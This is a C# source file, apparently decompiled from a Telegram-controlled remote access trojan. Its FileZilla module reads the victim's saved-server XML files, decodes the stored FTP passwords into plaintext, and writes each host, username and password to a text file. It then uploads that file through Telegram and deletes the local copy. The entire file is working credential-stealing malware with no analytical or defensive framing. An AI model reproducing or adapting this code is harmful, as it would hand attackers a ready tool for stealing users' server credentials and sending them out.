using System;
using System.IO;
using System.Text;
using System.Xml;

namespace TelegramRAT;

internal class FileZilla
{
	public static void get()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
		string text2 = text + "sitemanager.xml";
		string text3 = text + "recentservers.xml";
		string text4 = "filezilla.txt";
		string text5 = "[FILEZILLA SERVERS]\n\n";
		if (!Directory.Exists(text))
		{
			telegram.sendText("\ud83d\udee0 FileZilla not installed");
			return;
		}
		if (File.Exists(text3))
		{
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(text3);
				foreach (XmlNode item in xmlDocument.GetElementsByTagName("Server"))
				{
					string text6 = "ftp://" + item["Host"]!.InnerText + ":" + item["Port"]!.InnerText + "/";
					string innerText = item["User"]!.InnerText;
					string @string = Encoding.UTF8.GetString(Convert.FromBase64String(item["Pass"]!.InnerText));
					text5 = text5 + "URL: " + text6 + "\nUSERNAME: " + innerText + "\nPASSWORD: " + @string + "\n\n";
				}
			}
			catch
			{
				telegram.sendText("⛔ Failed to read recentserver.xml");
			}
		}
		if (File.Exists(text2))
		{
			try
			{
				XmlDocument xmlDocument2 = new XmlDocument();
				xmlDocument2.Load(text2);
				foreach (XmlNode item2 in xmlDocument2.GetElementsByTagName("Server"))
				{
					string text7 = "ftp://" + item2["Host"]!.InnerText + ":" + item2["Port"]!.InnerText + "/";
					string innerText2 = item2["User"]!.InnerText;
					string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(item2["Pass"]!.InnerText));
					text5 = text5 + "URL: " + text7 + "\nUSERNAME: " + innerText2 + "\nPASSWORD: " + string2 + "\n\n";
				}
			}
			catch
			{
				telegram.sendText("⛔ Failed to read sitemanager.xml");
			}
		}
		File.WriteAllText(text4, text5);
		telegram.UploadFile(text4, removeAfterUpload: true);
	}
}
